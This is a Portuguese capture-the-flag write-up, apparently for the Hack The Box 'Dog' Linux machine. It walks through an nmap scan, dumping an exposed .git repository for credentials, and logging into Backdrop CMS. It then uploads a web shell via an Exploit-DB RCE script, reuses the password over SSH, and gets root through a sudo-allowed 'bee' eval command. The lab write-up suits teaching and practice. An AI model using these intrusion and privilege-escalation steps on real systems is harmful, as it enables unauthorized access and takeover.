#Difficult : Easy
#OS : Linux
***
## Port Scanning
Como sempre começamos escaneando as portas abertas na máquina para termos uma noção de quais serviços estão rodando na máquina.
```bash
nmap 10.10.11.58 -sC -Pn -sV -A -oN nmap_output
```
![[Pasted image 20250331185850.png]]

Logo aqui já temos várias informações importantes como o repositório em `.git` o nome do serviço rodando (`Backdrop CMS`) e o arquivo `robots.txt`.
***
## Git Directory Disclosure
Como não temos nada a perder, vamos baixar o diretório para uma possível busca no futuro.
```bash
pip install git-dumper
mkdir site_content
git dumper "http://10.10.11.58/.git" ./site_content 
```

Há um arquivo de configuração, podemos vê-lo. Como ele tem muitos comentários, fazer um filtro.
```bash
ls ./site_content
cat ./site_content/settings.php | grep -v "*"
```
![[Pasted image 20250331192017.png]]
Nas primeiras linhas, acho uma credencial disponível, ma ainda não temos nenhum usuário para usa-la.
***
## Broken authentication
Podemos dar uma olhada no site para ver se temos algo de interessante.
![[Pasted image 20250331191102.png]]

Em `About` temos uma informação interessante, o domínio da empresa visível em  `support@dog.htb`.
![[Pasted image 20250331191305.png]]

Podemos fazer uma busca desse domínio no dump do diretório `.git` que baixamos.
```bash
grep -Ri "@dog.htb" ./site_content
```
![[Pasted image 20250331192251.png]]
Conseguimos 2 possíveis usuários : `dog@dog.htb` | `tiffany@dog.htb`. Podemos tentar usa-los com a senha que descobrimos anteriormente.

A primeira tentativa com `dog@dog.htb` indica que este usuário não existe. Mas ao tentar com `tiffany@dog.htb`, conseguimos logar.
![[Pasted image 20250331192739.png]]
***
## RCE
Em `Reports` e `Status Report` podemos ver qual a versão do sistema rodando, isso nos ajuda a procurar alguma vulnerabilidade para tal.
![[Pasted image 20250331193244.png]]

Encontro então um [exploit](https://www.exploit-db.com/exploits/52021) para um ``RCE`` nessa versão do `Backdrop`. Esse script gera um arquivo zip com as payloads, mas devemos ter acesso ao sistema para envia-las como um módulo.
![[Pasted image 20250331193347.png]]

Ele irá gerar uma payload para que possamos acessar em `http://10.10.11.58/modules/shell/shell.php`
```bash
mkdir exploit && cd exploit
wget -O exploit.py "https://www.exploit-db.com/download/52021"
chmod +x ./exploit.py
python3 ./exploit.py
```
![[Pasted image 20250331194523.png]]

Devemos compactar em `.tar` pois é um dos formatos aceitos pelo `Backdrop` para envio de módulos.
```bash
ls
tar -cvf shell.tar shell/
```
![[Pasted image 20250331194741.png]]

Após isso podemos ir em `Functionality`, `Install new modules` e `Manual installation`.
![[Pasted image 20250331195347.png]]

Após isso podemos verificar a ``url`` e emitir um comando no prompt para verificar se conseguimos a conexão.
![[Pasted image 20250331195429.png]]

Aparentemente a máquina não está habilitada a fazer uma conexão remota. Mas podemos tentar nossa senha com algum usuário na máquina.
![[Pasted image 20250331200433.png]]

Ao fazer uma conexão `SSH` com o usuário `johncusack` e mesma senha de `tiffany` garantimos acesso.
```bash
ssh johncusack@10.10.11.58
id
```
![[Pasted image 20250331200854.png]]

**E estamos dentro!**
***
## PRIV ESC
Agora enumerar os comandos que `johncusack` pode executar como `root`.
```bash
sudo -l
```
![[Pasted image 20250331201051.png]]

Podemos executar o binário `/usr/local/bin/bee` como `root`. Vamos executar para ver o que ele faz.
```bash
sudo /usr/local/bin/bee
```
![[Pasted image 20250331201221.png]]

Ele faz muitas coisas relacionadas ao `CMS` mas o que me chamou a atenção foi a função `ev`, que executa código `PHP` arbitrário.
```bash
sudo /usr/local/bin/bee ev "system('sudo su')"
✘  The required bootstrap level for 'eval' is not ready.

cd /var/www/html
sudo /usr/local/bin/bee ev "system('sudo su')"
```
![[Pasted image 20250331201543.png]]
Tivemos que mudar de pasta, pois o comando precisa ser executado dentro do diretório de "inicialização" do `CMS`.

**Owned!**
***

![[Pasted image 20250331201615.png]]